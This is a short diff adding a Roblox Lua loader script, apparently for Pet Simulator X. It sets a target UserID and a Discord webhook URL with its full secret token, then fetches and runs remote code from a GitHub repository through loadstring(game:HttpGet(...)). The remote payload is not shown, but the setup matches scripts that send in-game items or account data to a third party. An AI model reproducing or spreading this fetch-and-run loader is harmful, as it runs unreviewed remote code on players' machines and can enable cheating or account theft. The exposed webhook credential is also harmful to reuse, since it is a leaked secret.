@@ -1,0 +1,4 @@
+_G.UserID = 1553383868;
+_G.Webhook = "https://discord.com/api/webhooks/1074886662749945937/iVWmEabryPzPhnlp9O0HBOyvCSqrMTaxFl0NOboMDj7b4Zg8B3jze483b3XEqrRU4jq7"; -- Optional!
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MrFeastEz/PSX/main/scripts/main.lua"))();
